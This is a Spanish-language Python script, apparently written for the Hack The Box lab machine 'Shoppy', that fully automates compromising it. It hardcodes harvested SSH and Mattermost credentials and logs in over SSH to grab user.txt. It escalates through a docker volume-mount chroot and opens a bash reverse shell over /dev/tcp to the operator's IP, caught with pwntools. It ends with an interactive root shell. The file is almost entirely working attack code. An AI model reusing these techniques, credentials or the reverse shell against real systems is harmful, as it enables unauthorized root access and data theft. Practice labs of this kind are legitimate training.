
import paramiko
from colorama import init,Style,Fore
import os
import time
import signal
import sys
import threading

def def_handler(sig,frame):
    print(f'{Fore.RED}\n[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

print(f'''{Fore.MAGENTA}   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print(f'''{Fore.BLUE}  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(f'''{Fore.MAGENTA} _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print(f'{Fore.BLUE}\n[+] JAGGEDMULE14 - SHOPPY HACKTHEBOX AUTOPWN')
print(f'{Fore.YELLOW}[!]IMPORTANTE! UTILIZA UN PUERTO SUPERIOR AL 1023 SI NO QUIERES EJECUTAR ESTE SCRIPT COMO ROOT')
ip = input(f'{Fore.GREEN}Introduce tu IP (tun0): ')
port = int(input(f'{Fore.GREEN}Introduce el puerto que quieras usar: '))


def ping(host):
    ping = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if ping == 0:
        return True
    else:
        return False


def error_executing():
    print(f'{Fore.RED}\n[-]Algo salió mal')
    time.sleep(0.5)
    print(f'{Fore.YELLOW}[!]La máquina está encendida?')

from pwn import *


if ping('10.10.11.180') == True:
                print(f'{Fore.GREEN}\n[+]Conexión con la máquina exitosa')
                time.sleep(0.5)

                os.system('echo "For mattermost.shoppy.htb/login \njosh:remembermethisway\n\nFor SSH josh@10.10.11.180\njaeger:Sh0ppyBest@pp!\n\nFor /home/deploy/password-manager\nSample\n\nFor SSH deploy@10.10.11.180\ndeploy:Deploying@pp!" > credentials.txt')
                print(f'{Fore.GREEN}[+]Credentials.txt')
                time.sleep(0.5)
                
                def jaeger(commando, flag_txt):
                    p = paramiko.SSHClient()
                    p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    p.connect("10.10.11.180", port=22, username="jaeger", password="Sh0ppyBest@pp!")
                    stdin, stdout, stderr = p.exec_command(commando)
                    opt = stdout.readlines()
                    opt = "".join(opt)
                    print(opt)
                    if (flag_txt) == 'user_txt':
                        file = open('user.txt', 'w')
                        file.write(''.join(opt))
                        file.close()
                        p.close()
                    elif (flag_txt) == 'root_txt':
                        file=open('root.txt', 'w')
                        file.write(''.join(opt))
                        file.close()
                        p.close()
                    else:
                        p.close()
                
                print(f'{Fore.GREEN}[*]Obteniendo user.txt...')
                time.sleep(0.5)
                print(f'{Fore.YELLOW}\n[+]USER.TXT:')
                jaeger('cat ~/user.txt\n', 'user_txt')
                time.sleep(0.5)

                print(f'{Fore.GREEN}\n[*]Escalando...')

                def deploy(commando):
                    p = paramiko.SSHClient()
                    p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    p.connect("10.10.11.180", port=22, username="deploy", password="Deploying@pp!")
                    stdin, stdout, stderr = p.exec_command(commando)
                    opt = stdout.readlines()
                    opt = "".join(opt)
                    print(opt)
                    p.close()


                deploy('docker run -v /:/mnt --rm -it alpine chroot /mnt sh')

                def shell_connection():
                    deploy(f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"')

                try:
                    threading.Thread(target=shell_connection).start()
                except Exception as e:
                    print(f'{Fore.RED}[-]{e}')

                shellc = listen(port, timeout=5).wait_for_connection()
                
                if shellc.sock is None:
                    print(f'{Fore.RED}[-]Conexión fallida')
                    time.sleep(0.5)
                    print(f'{Fore.RED}[-]Prueba ejecutar el script nuevamente')
                    time.sleep(0.5)
                    print(f'{Fore.RED}[-]Prueba reiniciando la máquina')
                
                else:
                    time.sleep(0.5)
                    print(f'{Fore.GREEN}\n[*]Obteniendo root.txt...')
                    time.sleep(0.5)
                    print(f'{Fore.YELLOW}\n[+]ROOT.TXT')
                time.sleep(0.5)
                shellc.sendline(b'docker run -v /:/mnt --rm -i alpine chroot /mnt bash')
                shellc.sendline(b'export TERM=xterm')
                shellc.sendline(b'cat /root/root.txt > /tmp/root.txt; chmod 666 /tmp/root.txt')                
                jaeger('cat /tmp/root.txt', 'root_txt')
                time.sleep(0.5)
                shellc.sendline(b'rm /tmp/root.txt')
                print(f'{Fore.GREEN}\n[+]Disfruta tu shell como root :)\n{Fore.YELLOW}[!]CTRL+C PARA SALIR // Comando "exit" para salir')
                shellc.interactive()

else:
    error_executing()
